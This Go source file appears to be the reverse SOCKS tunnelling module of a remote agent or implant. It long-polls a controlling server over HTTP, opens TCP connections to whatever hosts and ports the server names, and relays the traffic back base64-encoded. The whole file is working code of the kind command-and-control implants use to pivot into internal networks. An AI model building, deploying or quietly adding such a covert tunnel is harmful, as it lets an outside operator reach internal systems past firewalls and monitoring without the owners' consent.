package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"
)

type socksFrame struct {
	T    string `json:"t"`
	CID  string `json:"cid"`
	Host string `json:"host"`
	Port int    `json:"port"`
	B64  string `json:"b64"`
	OK   bool   `json:"ok"`
}

var (
	socksMu    sync.Mutex
	socksConns = map[string]net.Conn{}
	socksOn    bool
)

func startSocks() Result {
	socksMu.Lock()
	if socksOn {
		socksMu.Unlock()
		return Result{OK: true, Out: "socks agent already running"}
	}
	socksOn = true
	socksMu.Unlock()
	go socksLoop()
	return Result{OK: true, Out: "socks agent started"}
}

func stopSocks() Result {
	socksMu.Lock()
	if !socksOn {
		socksMu.Unlock()
		return Result{OK: true, Out: "socks agent not running"}
	}
	socksOn = false
	conns := socksConns
	socksConns = map[string]net.Conn{}
	socksMu.Unlock()
	for _, c := range conns {
		c.Close()
	}
	return Result{OK: true, Out: "socks agent stopped"}
}

func socksStatus() Result {
	socksMu.Lock()
	defer socksMu.Unlock()
	if socksOn {
		return Result{OK: true, Out: fmt.Sprintf("running · %d tunnel(s)", len(socksConns))}
	}
	return Result{OK: true, Out: "stopped"}
}

func postJSON(path string, v interface{}) ([]byte, error) {
	b, _ := json.Marshal(v)
	req, _ := http.NewRequest("POST", serverURL+path, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func socksSend(f socksFrame) {
	postJSON("/socks/events", map[string]interface{}{
		"session_id": sid(),
		"frames":     []socksFrame{f},
	})
}

func socksGet(cid string) net.Conn {
	socksMu.Lock()
	defer socksMu.Unlock()
	return socksConns[cid]
}

func socksLoop() {
	for {
		socksMu.Lock()
		on := socksOn
		socksMu.Unlock()
		if !on {
			return
		}
		raw, err := postJSON("/socks/poll", map[string]interface{}{
			"session_id": sid(), "timeout": 25,
		})
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		var pr struct {
			Frames []socksFrame `json:"frames"`
		}
		json.Unmarshal(raw, &pr)
		for _, f := range pr.Frames {
			switch f.T {
			case "connect":
				go socksConnect(f)
			case "data":
				if c := socksGet(f.CID); c != nil {
					b, _ := base64.StdEncoding.DecodeString(f.B64)
					c.Write(b)
				}
			case "close":
				if c := socksGet(f.CID); c != nil {
					c.Close()
				}
			}
		}
		if len(pr.Frames) == 0 {
			time.Sleep(250 * time.Millisecond)
		}
	}
}

func socksConnect(f socksFrame) {
	c, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", f.Host, f.Port), 10*time.Second)
	if err != nil {
		socksSend(socksFrame{T: "connected", CID: f.CID, OK: false})
		return
	}
	socksMu.Lock()
	socksConns[f.CID] = c
	socksMu.Unlock()
	socksSend(socksFrame{T: "connected", CID: f.CID, OK: true})

	buf := make([]byte, 16*1024)
	for {
		n, err := c.Read(buf)
		if n > 0 {
			socksSend(socksFrame{T: "data", CID: f.CID,
				B64: base64.StdEncoding.EncodeToString(buf[:n])})
		}
		if err != nil {
			break
		}
	}
	socksSend(socksFrame{T: "close", CID: f.CID})
	socksMu.Lock()
	delete(socksConns, f.CID)
	socksMu.Unlock()
}